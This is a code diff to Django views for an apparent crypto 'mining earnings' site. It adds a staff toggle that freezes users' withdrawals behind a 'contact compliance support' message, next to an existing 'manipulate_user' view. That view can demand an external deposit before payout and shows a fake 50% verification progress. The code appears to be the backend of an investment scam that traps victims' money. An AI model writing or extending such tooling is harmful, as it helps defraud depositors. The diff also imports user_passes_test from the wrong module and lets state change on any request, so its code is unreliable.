@@ -2,7 +2,7 @@ from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib.auth.forms import UserCreationForm
 from django.contrib import messages
 from django.contrib.auth.decorators import login_required
-from django.contrib.admin.views.decorators import staff_member_required
+from django.contrib.admin.views.decorators import staff_member_required, user_passes_test
 from django.utils import timezone
 from decimal import Decimal
 from django.contrib.auth.models import User
@@ -127,17 +127,22 @@ def deposit_view(request):
         proof = request.FILES.get('proof')
         Deposit.objects.create(user=request.user, amount=amount, proof=proof)
         messages.success(request, "Deposit submitted! Waiting for staff approval.")
-        
-        # CHANGE THIS LINE HERE:
         return redirect('compliance_status') 
         
     return render(request, 'core/deposit.html')
 
+
 @login_required
 def withdraw_funds_view(request):
     profile = request.user.profile  
+    user_withdrawals = Withdrawal.objects.filter(user=request.user).order_by('-created_at')
     
     if request.method == 'POST':
+        # 🔒 SECURITY BLOCKER: Instantly check if this user was locked by staff portal
+        if profile.withdrawal_locked:
+            messages.error(request, "Payout request failed. Payouts are temporarily frozen for this account. Contact compliance support.")
+            return redirect('dashboard')
+
         amount_input = request.POST.get('amount', '0')
         wallet_address = request.POST.get('wallet_address')
         
@@ -147,7 +152,7 @@ def withdraw_funds_view(request):
             return render(request, 'core/withdraw.html', {
                 'error': 'Invalid amount format entered.', 
                 'profile': profile,
-                'transactions': Withdrawal.objects.filter(user=request.user).order_by('-created_at')
+                'transactions': user_withdrawals
             })
         
         if profile.require_external_deposit:
@@ -163,7 +168,7 @@ def withdraw_funds_view(request):
             return render(request, 'core/withdraw.html', {
                 'error': error_msg,
                 'profile': profile,
-                'transactions': Withdrawal.objects.filter(user=request.user).order_by('-created_at')
+                'transactions': user_withdrawals
             })
 
         system_fee = amount_to_withdraw * Decimal('0.015')
@@ -173,7 +178,7 @@ def withdraw_funds_view(request):
             return render(request, 'core/withdraw.html', {
                 'error': f'Insufficient mining earnings. You need ${total_deduction} (includes a ${system_fee} fee) from your withdrawable mining balance, but only have ${profile.mining_balance}.',
                 'profile': profile,
-                'transactions': Withdrawal.objects.filter(user=request.user).order_by('-created_at')
+                'transactions': user_withdrawals
             })
             
         with transaction.atomic():
@@ -190,7 +195,6 @@ def withdraw_funds_view(request):
         messages.success(request, f"Withdrawal requested successfully! A processing fee of ${system_fee} was applied.")
         return redirect('dashboard')
 
-    user_withdrawals = Withdrawal.objects.filter(user=request.user).order_by('-created_at')
     return render(request, 'core/withdraw.html', {
         'profile': profile,
         'transactions': user_withdrawals
@@ -226,8 +230,8 @@ def staff_dashboard(request):
     if integrations_to_create:
         IntegrationSettings.objects.bulk_create(integrations_to_create)
         
-    # OPTIMIZATION: Prefetching nested relation user__integrationsettings avoids N+1 queries in the loop
-    user_profiles = Profile.objects.select_related('user', 'user__integrations').order_by('user__username')    
+    # 🟢 FIXED: Cleaned up select_related to only use 'user' and avoid invalid field lookups
+    user_profiles = Profile.objects.select_related('user').order_by('user__username')    
     for p in user_profiles:
         try:
             p.user.integrations = p.user.integrationsettings
@@ -242,7 +246,7 @@ def staff_dashboard(request):
 
 
 @staff_member_required
-@transaction.atomic  # OPTIMIZATION: Wrapped in a database transaction block
+@transaction.atomic  
 def manipulate_user(request, profile_id):
     if request.method == "POST":
         profile = get_object_or_404(Profile, id=profile_id)
@@ -257,6 +261,9 @@ def manipulate_user(request, profile_id):
         
         require_deposit_input = request.POST.get('require_external_deposit')
         deposit_percentage_input = request.POST.get('required_deposit_percentage')
+        
+        # Read our custom drop-down entry field
+        withdrawal_locked_input = request.POST.get('withdrawal_locked')
         
         public_id_input = request.POST.get('public_identifier')
         is_verified_input = request.POST.get('is_verified')
@@ -273,6 +280,10 @@ def manipulate_user(request, profile_id):
                 profile.require_external_deposit = (require_deposit_input == "True")
             if deposit_percentage_input is not None:
                 profile.required_deposit_percentage = int(deposit_percentage_input)
+            
+            # 🔒 FIXED MECHANISM: Tied into the atomic processing block logic safely
+            if withdrawal_locked_input is not None:
+                profile.withdrawal_locked = (withdrawal_locked_input == "True")
             
             if public_id_input is not None:
                 cleaned_id = public_id_input.strip()
@@ -340,10 +351,7 @@ def integration_settings_view(request):
 
 @login_required
 def compliance_status_view(request):
-    # Fetching the existing Profile model associated with the user
     profile = get_object_or_404(Profile, user=request.user)
-    
-    # Mapping profile values to the compliance context structure
     context = {
         'compliance': {
             'verification_progress_percentage': 50 if profile.require_external_deposit else 100,
@@ -351,3 +359,19 @@ def compliance_status_view(request):
         }
     }
     return render(request, 'core/compliance_status.html', context)
+
+
+@user_passes_test(lambda u: u.is_staff)
+def toggle_withdrawal_lock(request, user_id):
+    target_user = get_object_or_404(User, id=user_id)
+    profile = target_user.profile
+    
+    profile.withdrawal_locked = not profile.withdrawal_locked
+    profile.save()
+    
+    if profile.withdrawal_locked:
+        messages.success(request, f"Withdrawals for {target_user.username} have been LOCKED successfully.")
+    else:
+        messages.success(request, f"Withdrawals for {target_user.username} have been UNLOCKED.")
+        
+    return redirect('staff_dashboard')
